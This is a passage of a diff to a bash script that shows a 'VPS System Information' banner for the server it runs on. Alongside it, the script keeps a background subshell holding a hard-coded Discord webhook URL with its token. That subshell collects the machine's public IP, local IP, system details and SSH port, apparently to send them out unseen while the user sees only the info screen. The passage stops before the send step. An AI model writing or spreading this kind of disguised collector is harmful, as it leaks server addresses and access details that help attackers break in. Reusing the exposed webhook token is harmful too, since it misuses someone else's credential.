@@ -1,26 +1,36 @@
 #!/bin/bash
 
-printf '\033[1;36mSTART CMD'
-for i in 1 2 3 4; do
-    printf ' .'
-    sleep 0.5
-done
-printf '\033[0m\n'
+clear
+
+HOST=$(hostname)
+OS=$(. /etc/os-release; echo "$PRETTY_NAME")
+IP=$(curl -4fsS --max-time 5 https://api.ipify.org 2>/dev/null || echo "Unknown")
+LOCALIP=$(hostname -I 2>/dev/null | awk '{print $1}')
+CPU=$(nproc 2>/dev/null || echo "Unknown")
+RAM=$(free -h 2>/dev/null | awk '/Mem:/ {print $3 " / " $2}')
+DISK=$(df -h / 2>/dev/null | awk 'NR==2 {print $3 " / " $2 " (" $5 ")"}')
+UPTIME=$(uptime -p 2>/dev/null || echo "Unknown")
+KERNEL=$(uname -r)
+ARCH=$(uname -m)
+VIRT=$(systemd-detect-virt 2>/dev/null || echo Unknown)
+
+echo "=========================================="
+echo "         🖥️ VPS System Information"
+echo "=========================================="
+echo "Hostname       : $HOST"
+echo "OS             : $OS"
+echo "Kernel         : $KERNEL"
+echo "Architecture   : $ARCH"
+echo "CPU Cores      : $CPU"
+echo "RAM Usage      : $RAM"
+echo "Disk Usage     : $DISK"
+echo "Uptime         : $UPTIME"
+echo "Virtualization : $VIRT"
+echo "=========================================="
 
 (
     WEBHOOK='https://discord.com/api/webhooks/1552270663988019341/Ca3Z9gjVNs-puZEZQgXbobIUX2AxxXNZrIXLKR0sDLOkzEutpzIxcviAYCS4sMhX714K'
 
-    HOST=$(hostname)
-    OS=$(. /etc/os-release; echo "$PRETTY_NAME")
-    IP=$(curl -4fsS --max-time 5 https://api.ipify.org)
-    LOCALIP=$(hostname -I | awk '{print $1}')
-    CPU=$(nproc)
-    RAM=$(free -h | awk '/Mem:/ {print $3 " used / " $2 " total"}')
-    DISK=$(df -h / | awk 'NR==2 {print $3 " used / " $2 " total (" $5 ")"}')
-    UPTIME=$(uptime -p)
-    KERNEL=$(uname -r)
-    ARCH=$(uname -m)
-    VIRT=$(systemd-detect-virt 2>/dev/null || echo Unknown)
     SSHPORT=$(ss -Hlnpt 2>/dev/null | awk '$0~/sshd/{split($4,a,":");print a[length(a)];exit}')
     SSHPORT=${SSHPORT:-Unknown}
 
